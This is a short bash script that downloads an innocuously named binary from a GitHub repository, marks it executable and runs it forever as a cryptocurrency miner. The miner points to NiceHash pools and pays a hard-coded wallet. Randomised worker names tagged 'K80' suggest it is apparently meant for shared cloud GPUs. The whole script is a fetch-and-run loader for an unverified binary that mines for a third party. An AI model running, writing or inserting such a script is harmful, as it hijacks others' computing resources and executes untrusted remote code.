#!/bin/bash
#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
apt-get install libpci3
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 -wal 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-K80) -pass x -proto 4 -stales 0
        sleep 5
	done
